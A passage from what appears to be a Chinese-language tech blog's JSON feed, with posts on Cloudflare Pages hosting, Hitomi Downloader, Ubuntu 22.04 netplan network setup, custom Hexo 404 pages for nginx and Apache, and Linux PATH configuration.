登入就會自動登進去</p>\n</blockquote>\n",
            "tags": [
                "Self-Hosting",
                "Wiki JS",
                "Keyckoak",
                "身分認證"
            ]
        },
        {
            "id": "https://zonego.tw/2023/02/10/cloudflare-page/",
            "url": "https://zonego.tw/2023/02/10/cloudflare-page/",
            "title": "Cloudflare Page 架站教學",
            "date_published": "2023-02-10T04:39:40.000Z",
            "content_html": "<p>Cloudflare Page 使用上跟 GitHub Page 類似<br>就差在 GitHub Page 只能用靜態網站檔案，用框架產生的靜態網站就必須先編好才能推上去儲藏庫<br>Cloudflare Page 可以支援編譯</p>\n<span id=\"more\"></span>\n\n<h2 id=\"設定步驟\"><a href=\"#設定步驟\" class=\"headerlink\" title=\"設定步驟\"></a>設定步驟</h2><p>官方文件 <a href=\"https://developers.cloudflare.com/pages/\">https://developers.cloudflare.com/pages/</a></p>\n<p>簡單步驟總結：</p>\n<ol>\n<li><p>在 GitHub 或 GitLab 建立網頁用的儲藏庫 (repository)</p>\n</li>\n<li><p>Cloudflare page 連結 GitHub 或 GitLab</p>\n</li>\n<li><p>在 Cloudflare 設定網站用的 domain name</p>\n</li>\n</ol>\n<p>完成🎉</p>\n<hr>\n<h3 id=\"設定-Git-儲藏庫\"><a href=\"#設定-Git-儲藏庫\" class=\"headerlink\" title=\"設定 Git 儲藏庫\"></a>設定 Git 儲藏庫</h3><p>首先到 GitHub 或 GitLab 建立網頁用的儲藏庫 (就基本的 git 操作，這邊就不多作教學)</p>\n<p>網站內容跟 GitHub Page 一樣，只要是靜態網站都可以，不管是直接寫或是用框架產生都可以<br>比 GitHub Page 好的一點是，可以直接推送框架的程式上去，部署時編譯 (但免費版有限制)</p>\n<p>GitHub Page 跟 Cloudflare page 也不需要太糾結要用哪個，反正都免費都可以先用看看<br>例如本網站的內容就是用 Hexo 框架產生，先推送到 GitHub Page，Cloudflare page 用同個儲藏庫當來源</p>\n<p><img src=\"https://i.imgur.com/wBJAHWU.gif\"></p>\n<p>在 <a href=\"https://zonelin.github.io/\">https://zonelin.github.io/</a> 也可以找到本站</p>\n<h3 id=\"Cloudflare-新增-page-專案\"><a href=\"#Cloudflare-新增-page-專案\" class=\"headerlink\" title=\"Cloudflare 新增 page 專案\"></a>Cloudflare 新增 page 專案</h3><p>登入 Cloudflare 在 page 設定內新增一個專案　<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/cfpage-addproject.png\" alt=\"Cloudflare add project\" data-caption=\"Cloudflare add project\" loading=\"lazy\"></p>\n<p>登入 GitHub 或 GitLab 選擇要用的存儲庫 repository<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/cfpage-addproject-git.png\" alt=\"Cloudflare add project\" data-caption=\"Cloudflare add project\" loading=\"lazy\"></p>\n<p>設定要觸發抓取的分支 (建議把部署跟開發中做不同的分支)<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/cfpage-addproject-setting.png\" alt=\"Cloudflare add project\" data-caption=\"Cloudflare add project\" loading=\"lazy\"></p>\n<p>如果是想要推送後，再用框架產生靜態網頁可以調整這邊設定<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/cfpage-addproject-setting2.png\" alt=\"Cloudflare add project\" data-caption=\"Cloudflare add project\" loading=\"lazy\"></p>\n<p>點儲存部屬 Save and Deploy 後會開始從 Git 存儲庫抓程式碼下來編譯<br>如果是靜態頁面，就只有抓下來 (畢竟我們的 Build setting 是空的)<br>完成會自動給一個自動分配的網址，例如本站就是 <a href=\"https://blog-public-3io.pages.dev/\">blog-public-3io.pages.dev</a></p>\n<p>需要自訂網址可以到專案的 Custom domains 設定，免費版有使用上限 <a href=\"#%E5%85%8D%E8%B2%BB%E7%89%88%E4%BD%BF%E7%94%A8%E9%99%90%E5%88%B6\">免費版限制</a><br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/cfpage-domain.png\" alt=\"Cloudflare domain\" data-caption=\"Cloudflare domain\" loading=\"lazy\"></p>\n<p>到這邊就完成了🎉</p>\n<p>用 Cloudflare 還有個好處，Cloudflare 會自動套 Web Analytics<br><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"/images/content/cfpage-web-analytics.png\" alt=\"Cloudflare web analytics\" data-caption=\"Cloudflare web analytics\" loading=\"lazy\"></p>\n<h2 id=\"免費版使用限制\"><a href=\"#免費版使用限制\" class=\"headerlink\" title=\"免費版使用限制\"></a>免費版使用限制</h2><p>根據<a href=\"https://developers.cloudflare.com/pages/platform/limits\">官方文件</a></p>\n<p>每個帳號可以件幾個網站專案、預覽板本好像沒限制</p>\n<h3 id=\"建置\"><a href=\"#建置\" class=\"headerlink\" title=\"建置\"></a>建置</h3><p>免費版能從 GitHub 抓程式碼重新建置每個月500次，建置時間不得過20分鐘<br>推送程式碼到 GitHub 也會觸發重新建置</p>\n<blockquote>\n<p>所以我習慣在本機把 hexo 建制好，再推送到 GitHub，省編譯時間</p>\n</blockquote>\n<h3 id=\"Domains\"><a href=\"#Domains\" class=\"headerlink\" title=\"Domains\"></a>Domains</h3><p>最多 10 個自訂 domain</p>\n<h3 id=\"檔案\"><a href=\"#檔案\" class=\"headerlink\" title=\"檔案\"></a>檔案</h3><p>單一個網站專案，最多到 2 萬個檔案<br>單一檔案、素材最大 25MB</p>\n<blockquote>\n<p>有放圖片要注意下容量</p>\n</blockquote>\n<h3 id=\"Headers\"><a href=\"#Headers\" class=\"headerlink\" title=\"Headers\"></a>Headers</h3><p>最多 100 header 規則</p>\n<h3 id=\"重導向規則\"><a href=\"#重導向規則\" class=\"headerlink\" title=\"重導向規則\"></a>重導向規則</h3><p>最多 100 個</p>\n<hr>\n",
            "tags": [
                "網站架設",
                "Cloudflare",
                "靜態網站",
                "Git"
            ]
        },
        {
            "id": "https://zonego.tw/2023/01/19/hitomi-downloader/",
            "url": "https://zonego.tw/2023/01/19/hitomi-downloader/",
            "title": "Hitomi Downloader",
            "date_published": "2023-01-19T02:59:09.000Z",
            "content_html": "<span id=\"more\"></span>\n\n<p>Hitomi Downloader 是一個開源的影音下載工具，支援各大網站的影音下載</p>\n<p>目前只有 windows 的版本</p>\n<p>GitHub <a href=\"https://github.com/KurtBestor/Hitomi-Downloader\">https://github.com/KurtBestor/Hitomi-Downloader</a><br>下載位置 <a href=\"https://github.com/KurtBestor/Hitomi-Downloader/releases\">https://github.com/KurtBestor/Hitomi-Downloader/releases</a></p>\n<p>詳細支援網站請看 <a href=\"https://github.com/KurtBestor/Hitomi-Downloader#supported-sites\">https://github.com/KurtBestor/Hitomi-Downloader#supported-sites</a></p>\n<p>除了 Youtube 等影音網站還支援 Pixiv</p>\n<blockquote>\n<p>Hitomi Downloader 底層用 youtube-dl 的分支專案 <a href=\"https://github.com/yt-dlp/yt-dlp\">yt-dlp</a> 作為影音下載器<br>yt-dlp <a href=\"https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md\">支援的網站</a>，Hitomi Downloader 基本就能下載</p>\n</blockquote>\n<p>套個官方的示範圖</p>\n<p><img src=\"https://github.com/KurtBestor/Hitomi-Downloader/raw/master/imgs/how_to_download.gif\"></p>\n",
            "tags": [
                "Windows"
            ]
        },
        {
            "id": "https://zonego.tw/2022/12/25/ubuntu22-netsetting/",
            "url": "https://zonego.tw/2022/12/25/ubuntu22-netsetting/",
            "title": "Ubuntu 22.04 設定網路連線",
            "date_published": "2022-12-25T10:44:10.000Z",
            "content_html": "<span id=\"more\"></span>\n\n<p>Ubuntu 20.04 後改用 netplan 作為指令網路設定工具</p>\n<h2 id=\"設定檔\"><a href=\"#設定檔\" class=\"headerlink\" title=\"設定檔\"></a>設定檔</h2><p>netplan 設定檔預設放在 <code>/etc/netplan/00-installer-config.yaml</code></p>\n<blockquote>\n<p>修改及套用需要 root 權限</p>\n</blockquote>\n<h3 id=\"查看網卡代號\"><a href=\"#查看網卡代號\" class=\"headerlink\" title=\"查看網卡代號\"></a>查看網卡代號</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">ip addr<br></code></pre></td></tr></table></figure>\n<p>跑出來的結果像這樣</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=\"hljs-number\">1000</span><br>    <span class=\"hljs-attribute\">link</span>/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span><br>    <span class=\"hljs-attribute\">inet</span> <span class=\"hljs-number\">127.0.0.1</span>/<span class=\"hljs-number\">8</span> scope host lo<br>       <span class=\"hljs-attribute\">valid_lft</span> forever preferred_lft forever<br>    <span class=\"hljs-attribute\">inet6</span> ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host<br>       <span class=\"hljs-attribute\">valid_lft</span> forever preferred_lft forever<br><span class=\"hljs-attribute\">2</span>: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=\"hljs-number\">1500</span> qdisc fq_codel state UP group default qlen <span class=\"hljs-number\">1000</span><br>    <span class=\"hljs-attribute\">link</span>/ether xx:xx:xx:xx:xx:xx brd xx:xx:xx:xx:xx:xx<br>    <span class=\"hljs-attribute\">altname</span> enp0s18<br>    <span class=\"hljs-attribute\">inet</span> <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">1</span>.xx/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">172.16.0.255</span> scope global ens18<br>       <span class=\"hljs-attribute\">valid_lft</span> forever preferred_lft forever<br>    <span class=\"hljs-attribute\">inet6</span> <span class=\"hljs-number\">0000</span>::<span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span>:<span class=\"hljs-number\">0000</span>/<span class=\"hljs-number\">64</span> scope link<br>       <span class=\"hljs-attribute\">valid_lft</span> forever preferred_lft forever<br></code></pre></td></tr></table></figure>\n\n<p>編號 2 後面的 <code>ens18</code> 就是網卡代號</p>\n<blockquote>\n<p>我的電腦只有裝一張網卡結果才會只到編號 2，如果有多張網卡會接續列在下面</p>\n</blockquote>\n<p>接下來就是開始編輯設定檔</p>\n<p>使用 nano 編輯器修改設定檔</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">nano /etc/netplan/50-cloud-init.yaml<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"使用-DHCP-自動設定-IP\"><a href=\"#使用-DHCP-自動設定-IP\" class=\"headerlink\" title=\"使用 DHCP 自動設定 IP\"></a>使用 DHCP 自動設定 IP</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">network:</span><br>  <span class=\"hljs-attr\">version:</span> <span class=\"hljs-number\">2</span><br>  <span class=\"hljs-attr\">renderer:</span> <span class=\"hljs-string\">networkd</span><br>  <span class=\"hljs-attr\">ethernets:</span><br>    <span class=\"hljs-comment\"># 下面 ens18 改成你的網卡代號</span><br>    <span class=\"hljs-attr\">ens18:</span><br>      <span class=\"hljs-attr\">dhcp4:</span> <span class=\"hljs-literal\">true</span><br>    <span class=\"hljs-comment\"># 如果有多張網卡，設定繼續加在下面</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"設定固定-IP\"><a href=\"#設定固定-IP\" class=\"headerlink\" title=\"設定固定 IP\"></a>設定固定 IP</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">network:</span><br>  <span class=\"hljs-attr\">version:</span> <span class=\"hljs-number\">2</span><br>  <span class=\"hljs-attr\">ethernets:</span><br>    <span class=\"hljs-attr\">ens18:</span><br>      <span class=\"hljs-attr\">addresses:</span><br>      <span class=\"hljs-comment\"># 設定固定 IP</span><br>        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.2</span><span class=\"hljs-string\">/24</span><br>      <span class=\"hljs-comment\"># 預設閘道器</span><br>      <span class=\"hljs-attr\">gateway4:</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span><br>      <span class=\"hljs-comment\"># 預設 DNS</span><br>      <span class=\"hljs-attr\">nameservers:</span><br>        <span class=\"hljs-attr\">addresses:</span> [<span class=\"hljs-number\">8.8</span><span class=\"hljs-number\">.8</span><span class=\"hljs-number\">.8</span>, <span class=\"hljs-number\">1.1</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span>]<br></code></pre></td></tr></table></figure>\n\n<p>固定 IP 中 <code>/24</code> 代表子網遮罩，相當於 　<code>255.255.255.0</code></p>\n<p>如果不會換算，可以參考 IPv4 子網計算機 <a href=\"https://damaha-labo.site/converter/zh-Hant/IT/CalcSubnetMask\">https://damaha-labo.site/converter/zh-Hant/IT/CalcSubnetMask</a></p>\n<p>通常沒特殊需求的話，家用路由器的子網遮罩都是用 <code>/24</code> <code>255.255.255.0</code></p>\n<hr>\n<p>在 ubuntu 22.04 新版的 Netplan 中， <code>gateway4</code> 這個設定已被棄用</p>\n<p>新版的設定檔長這樣</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">network:</span><br>  <span class=\"hljs-attr\">version:</span> <span class=\"hljs-number\">2</span><br>  <span class=\"hljs-attr\">ethernets:</span><br>    <span class=\"hljs-attr\">ens18:</span><br>      <span class=\"hljs-attr\">addresses:</span><br>      <span class=\"hljs-comment\"># 設定固定 IP</span><br>        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.2</span><span class=\"hljs-string\">/24</span><br>      <span class=\"hljs-comment\"># 預設 DNS</span><br>      <span class=\"hljs-attr\">nameservers:</span><br>        <span class=\"hljs-attr\">addresses:</span> [<span class=\"hljs-number\">8.8</span><span class=\"hljs-number\">.8</span><span class=\"hljs-number\">.8</span>, <span class=\"hljs-number\">1.1</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span>]<br>      <span class=\"hljs-comment\"># 預設閘道器</span><br>      <span class=\"hljs-attr\">routes:</span><br>        <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">to:</span> <span class=\"hljs-string\">default</span><br>          <span class=\"hljs-attr\">via:</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span><br></code></pre></td></tr></table></figure>\n\n<p>預設路由的設定，改成可以設定多個預設閘道器(Gateway)</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">routes:</span><br>  <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">to:</span> <span class=\"hljs-string\">default</span><br>    <span class=\"hljs-attr\">via:</span> <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span><br>    <span class=\"hljs-attr\">metric:</span> <span class=\"hljs-number\">200</span><br>  <span class=\"hljs-bullet\">-</span> <span class=\"hljs-attr\">to:</span> <span class=\"hljs-string\">default</span><br>    <span class=\"hljs-attr\">via:</span> <span class=\"hljs-number\">11.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span><br>    <span class=\"hljs-attr\">metric:</span> <span class=\"hljs-number\">300</span><br></code></pre></td></tr></table></figure>\n<p>其中 <code>metric</code> 代表優先權重，值越小越優先使用</p>\n<h3 id=\"設定-WIFI-連線\"><a href=\"#設定-WIFI-連線\" class=\"headerlink\" title=\"設定 WIFI 連線\"></a>設定 WIFI 連線</h3><h4 id=\"取得-Wifi-網卡代號\"><a href=\"#取得-Wifi-網卡代號\" class=\"headerlink\" title=\"取得 Wifi 網卡代號\"></a>取得 Wifi 網卡代號</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">ls</span> /sys/class/net<br>enp0s25  lo  wlp3s0<br></code></pre></td></tr></table></figure>\n\n<p>通常在 Ubuntu 22.04 中 Wifi 網卡代號通常是 <code>wlan0</code> 或是 <code>wlp3s0</code></p>\n<p>在設定檔下面加上 Wifi 的部分即可</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">network:</span><br>    <span class=\"hljs-attr\">ethernets:</span><br>        <span class=\"hljs-attr\">eth0:</span><br>            <span class=\"hljs-attr\">dhcp4:</span> <span class=\"hljs-literal\">true</span><br>            <span class=\"hljs-attr\">optional:</span> <span class=\"hljs-literal\">true</span><br>    <span class=\"hljs-attr\">version:</span> <span class=\"hljs-number\">2</span><br>    <span class=\"hljs-attr\">wifis:</span><br>        <span class=\"hljs-attr\">wlp3s0:</span><br>            <span class=\"hljs-attr\">optional:</span> <span class=\"hljs-literal\">true</span><br>            <span class=\"hljs-attr\">access-points:</span><br>                <span class=\"hljs-attr\">&quot;SSID-NAME-HERE&quot;:</span><br>                    <span class=\"hljs-attr\">password:</span> <span class=\"hljs-string\">&quot;PASSWORD-HERE&quot;</span><br>            <span class=\"hljs-attr\">dhcp4:</span> <span class=\"hljs-literal\">true</span><br></code></pre></td></tr></table></figure>\n\n<p>至於要怎麼找附近可用的熱點…<br><img src=\"/images/content/do_you_guys_not_have_phones.jpg\"></p>\n<h2 id=\"保存、套用設定\"><a href=\"#保存、套用設定\" class=\"headerlink\" title=\"保存、套用設定\"></a>保存、套用設定</h2><p>範例使用的 nano 編輯器，儲存按法：<br><code>Ctrl</code> + <code>X</code>  -&gt;  <code>Y</code></p>\n<p>保存完後，用下面指令測試設定檔有無格式錯誤</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">netplan try<br></code></pre></td></tr></table></figure>\n\n<p>確定網路沒問題，在 120 秒內按 Enter 確定套用。<br>這招可以避免設定固定 IP 時設定錯誤斷網，畢竟很懶的跑去機器旁邊重新設定。</p>\n<p>如果想要直接套用，不用再另外檢查，可以用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">netplan apply<br></code></pre></td></tr></table></figure>\n\n<p>檢查是否設定成功</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">ip addr<br></code></pre></td></tr></table></figure>\n\n<p>看一下網卡有沒有配到 IP</p>\n<blockquote>\n<p>如果你的 Raspberry Pi 也是裝 Ubuntu，網路設定也是這樣修改</p>\n</blockquote>\n<h2 id=\"參考資料\"><a href=\"#參考資料\" class=\"headerlink\" title=\"參考資料\"></a>參考資料</h2><p>Netplan 設定範例 <a href=\"https://netplan.io/examples\">https://netplan.io/examples</a></p>\n",
            "tags": [
                "網路",
                "Ubuntu"
            ]
        },
        {
            "id": "https://zonego.tw/2022/12/21/hexo-404-page/",
            "url": "https://zonego.tw/2022/12/21/hexo-404-page/",
            "title": "Hexo 設定 404 頁面",
            "date_published": "2022-12-21T02:56:21.000Z",
            "content_html": "<p>404 頁面，也就是找不到網頁時的暫時頁面。雖然大部分網頁伺服器已經提供預設的 404 頁面，但公版有些蠻醜的。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"新增頁面\"><a href=\"#新增頁面\" class=\"headerlink\" title=\"新增頁面\"></a>新增頁面</h2><h3 id=\"方法一：使用-md-檔讓-Hexo-生成\"><a href=\"#方法一：使用-md-檔讓-Hexo-生成\" class=\"headerlink\" title=\"方法一：使用 md 檔讓 Hexo 生成\"></a>方法一：使用 md 檔讓 Hexo 生成</h3><p>簡單省事的做法就是在 source 資料夾內新增 404.md ，依照一般貼文的寫法，寫完讓 Hexo 產生頁面就好。</p>\n<h3 id=\"方法二：使用一般-html-檔\"><a href=\"#方法二：使用一般-html-檔\" class=\"headerlink\" title=\"方法二：使用一般 html 檔\"></a>方法二：使用一般 html 檔</h3><p>事先準備好 404.html 的靜態網頁，放到 source 資料夾內。</p>\n<p>例如使用範本 <a href=\"https://freefrontend.com/html-css-404-page-templates/\">https://freefrontend.com/html-css-404-page-templates/</a></p>\n<p>放入後修改 <code>_config.yml</code> 設定跳渲染 404.html (可參考 <a href=\"/2021/12/15/hexo-skip/\">Hexo 指定文件跳過渲染</a>)</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><code class=\"hljs yml\"><span class=\"hljs-string\">...</span><br><br><span class=\"hljs-attr\">skip_render:</span><br><span class=\"hljs-bullet\">-</span> <span class=\"hljs-number\">404.</span><span class=\"hljs-string\">html</span><br></code></pre></td></tr></table></figure>\n\n<p>一般檔案如 css 與 js 可以直接放著在 source 就好，Hexo 渲染網頁時會回直接搬到 public 資料夾內。</p>\n<h2 id=\"套用-404-頁面\"><a href=\"#套用-404-頁面\" class=\"headerlink\" title=\"套用 404 頁面\"></a>套用 404 頁面</h2><p>我們的網站有提供 404 頁面，但設定重導向就是網頁伺服器的工作了。</p>\n<h3 id=\"靜態網頁服務\"><a href=\"#靜態網頁服務\" class=\"headerlink\" title=\"靜態網頁服務\"></a>靜態網頁服務</h3><p>GitHub Page, CloudFlare Page 等免費的靜態網站服務，預設都會抓 source 資料夾下的 404.html 檔案作為 404 頁面。</p>\n<h3 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h3><p>預設網站設定檔通常是 <code>/etc/nginx/conf.d/default.conf</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs conf\"># The default server.<br>server &#123;<br>  listen       80 default_server;<br>  server_name  everythingelse;<br><br>  error_page 404 /404.html;<br><br>  # Everything is a 404<br>  location / &#123;<br>    return 404; #return the code 404<br>  &#125;<br><br>  # link the code to the file<br>  location = /404.html &#123;<br>    # 可以把頁面位置改成這樣，Hexo 部署時的對應位置就是 public 資料夾<br>    root  /var/www/nginx/www/;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h3><p>在網站資料夾內的 <code>/var/www/html/.htaccess</code> 檔案內加入</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ErrorDocument</span> <span class=\"hljs-number\">404</span> /<span class=\"hljs-number\">404</span>.html<br></code></pre></td></tr></table></figure>\n\n<p>或是編輯 <code>/etc/apache2/sites-enabled/000-default.com</code> 修改 VirtualHost</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"code\"><pre><code class=\"hljs jboss-cli\">&lt;VirtualHost&gt;<br>   <span class=\"hljs-string\">...</span><br>   ErrorDocument 404 <span class=\"hljs-string\">/404.html</span><br>   <span class=\"hljs-string\">...</span><br>&lt;<span class=\"hljs-string\">/VirtualHost</span>&gt;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"關於-SEO\"><a href=\"#關於-SEO\" class=\"headerlink\" title=\"關於 SEO\"></a>關於 SEO</h2><blockquote>\n<p>Google, Bing 等搜尋引擎，會將較合適的網站優先推到搜尋結果上。<br>為了讓排名靠前一些， SEO（搜尋引擎優化）就變得十分重要，尤其是要增加曝光度。<br>SEO 其中一項是需使用自訂的 404 頁面，也因此網站就會影響到網站的<del>廣告費</del>。</p>\n</blockquote>\n<h2 id=\"參考資料\"><a href=\"#參考資料\" class=\"headerlink\" title=\"參考資料\"></a>參考資料</h2><p><a href=\"https://docs.github.com/en/pages/getting-started-with-github-pages/creating-a-custom-404-page-for-your-github-pages-site\">github page 404 setting</a><br><a href=\"https://ubiq.co/tech-blog/how-to-create-custom-404-page-in-apache/\">apache custum 404 page</a><br><a href=\"https://stackoverflow.com/questions/7526996/nginx-how-to-always-return-a-custom-404-page-for-the-default-host\">nginx 404 page</a></p>\n",
            "tags": [
                "Hexo",
                "Blog"
            ]
        },
        {
            "id": "https://zonego.tw/2022/11/29/linux-path/",
            "url": "https://zonego.tw/2022/11/29/linux-path/",
            "title": "linux 環境變數及 Path 設定",
            "date_published": "2022-11-29T12:02:04.000Z",
            "content_html": "<h2 id=\"Linux-環境變數種類\"><a href=\"#Linux-環境變數種類\" class=\"headerlink\" title=\"Linux 環境變數種類\"></a>Linux 環境變數種類</h2><ol>\n<li>永久的：需要修改配置檔案，變數永久生效。</li>\n<li>臨時的：使用export命令宣告即可，變數在關閉shell或關機時失效。</li>\n</ol>\n<span id=\"more\"></span>\n\n<p>Mac 跟 Linux 都是由 Unix 發展的作業系統，在部分操作邏輯都相同，包含環境變數。</p>\n<h2 id=\"看目前的環境變數\"><a href=\"#看目前的環境變數\" class=\"headerlink\" title=\"看目前的環境變數\"></a>看目前的環境變數</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 使用 env 指令</span><br><span class=\"hljs-built_in\">env</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">XXXX@MacBook-Pro blog % <span class=\"hljs-built_in\">env</span><br>USER=XXXX<br>SECURITYSESSIONID=186ad<br>COMMAND_MODE=unix2003<br>HOME=/Users/XXXXXX<br>SHELL=/bin/zsh<br>...<br></code></pre></td></tr></table></figure>\n\n<p>如果已知環境變數的名稱，可以使用 echo 查看</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 查看環境變數 SHELL</span><br>XXXX@MacBook-Pro blog % <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$SHELL</span><br>/bin/zsh<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"設定環境變數\"><a href=\"#設定環境變數\" class=\"headerlink\" title=\"設定環境變數\"></a>設定環境變數</h2><h3 id=\"臨時性修改，重開機後就必須再做一次\"><a href=\"#臨時性修改，重開機後就必須再做一次\" class=\"headerlink\" title=\"臨時性修改，重開機後就必須再做一次\"></a>臨時性修改，重開機後就必須再做一次</h3><p>用 export 指令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 設定 PATH 變數為例</span><br><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$PATH</span>&quot;</span>:/home/bin<br><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-variable\">$&#123;PATH&#125;</span>:/home/bin<br></code></pre></td></tr></table></figure>\n<p>輸入之後可以使用export指令來查看環境變數是否有輸入進去。</p>\n<h3 id=\"永久性修改，需重開機之後才會有作用\"><a href=\"#永久性修改，需重開機之後才會有作用\" class=\"headerlink\" title=\"永久性修改，需重開機之後才會有作用\"></a>永久性修改，需重開機之後才會有作用</h3><h4 id=\"修改-profile\"><a href=\"#修改-profile\" class=\"headerlink\" title=\"修改 profile\"></a>修改 profile</h4><p>profile的路徑是在 “&#x2F;etc&#x2F;profile”，打開後在裡面加入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$PATH</span>&quot;</span>:/home/bin<br><span class=\"hljs-comment\"># 或是</span><br><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-variable\">$&#123;PATH&#125;</span>:/home/bin<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"修改-bashrc\"><a href=\"#修改-bashrc\" class=\"headerlink\" title=\"修改.bashrc\"></a>修改.bashrc</h4><p>.bashrc的路徑是在”&#x2F;home&#x2F;danny&#x2F;.bashrc”，在檔案最後面加入</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">PATH</span>=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$PATH</span>&quot;</span>:/home/bin<br><span class=\"hljs-comment\"># 或是</span><br><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">PATH</span>=<span class=\"hljs-variable\">$&#123;PATH&#125;</span>:/home/bin<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h2><ul>\n<li><a href=\"https://dotblogs.com.tw/grayyin/2019/06/25/142934\">阿輝的零碎筆記</a></li>\n<li><a href=\"https://iter01.com/567129.html\">Linux環境變數的設定、檢視、刪除</a></li>\n</ul>\n",
            "tags": [
                "Linux",
                "Mac",
                "環境變數"
            ]
        },
        {
            "id": "https://zonego.tw/2022/10/24/homebrew/",
            "url": "https://zonego.tw/2022/10/24/homebrew/",
            "title": "Mac 上的套件管理系統 Homebrew",
            "date_published": "2022-10-24T09:59:16.000Z",
